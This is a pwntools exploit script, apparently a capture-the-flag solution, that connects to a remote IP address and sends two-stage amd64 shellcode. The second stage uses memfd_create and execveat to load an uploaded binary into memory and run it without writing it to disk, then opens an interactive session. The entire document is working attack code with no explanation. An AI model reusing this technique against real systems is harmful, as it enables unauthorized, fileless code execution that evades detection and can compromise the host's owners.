from pwn import *

#r = process(["./shellcoder"])
r = remote("139.180.215.222", 20002)


context.arch = "amd64"


r.sendafter(":",asm("""
push rdi
pop rsi
xchg edi,edx
syscall
nop
"""))


#syscall(SYS_execveat, exec_fd, "", argv, NULL, AT_EMPTY_PATH);

r.send("\x90"*0x30+asm(shellcraft.pushstr("billy"))+asm("""
mov rax,319
mov rdi,rsp
mov rsi,0
syscall
mov rbx,rax
loop:
mov rdi,0
mov rsi,rsp
mov rdx,0x400
mov rax,0
syscall
cmp rax,0
je go
mov rdi,rbx
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall
jmp loop
go:
mov rdi,rbx
push 0
mov rsi,rsp
xor rdx,rdx
xor r10,r10
mov r8,0x1000
mov rax,322
syscall
"""))

r.recvrepeat(1)
r.send(open("x").read())
r.shutdown("send")

r.interactive()
